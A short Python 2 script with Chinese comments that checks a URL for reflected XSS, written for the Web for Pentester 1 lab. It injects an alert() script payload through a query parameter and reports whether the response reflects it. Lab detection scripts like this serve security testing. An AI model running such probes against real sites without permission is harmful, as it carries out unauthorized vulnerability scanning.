#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# 测试反射型XSS，检测弹窗代码
# 测试环境为 Web for Pentester 1的/xss/example1.php
import requests
import sys

def verify(url):
    # 本地环境测试地址 url = "http://192.168.166.119/xss/example1.php?name="
    payload = "%3Cscript%3Ealert%287342%29%3C%2Fscript%3E"
    target = url + payload
    try:
        # 发送http get请求 (若需要登陆，则添加cookies，此处不需要登录）
        res = requests.get(target)
        res.encoding = 'utf-8'
        data = res.text
        # print data
        if data:
            # 处理 响应
            if "<script>alert(7342)</script>" in data:
                print "%s  is vulnerable" % target
            else:
                print "%s  is not vulnerable" % target
    except Exception, e:
        print "Something happend..."
        print e

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == "__main__":
    main()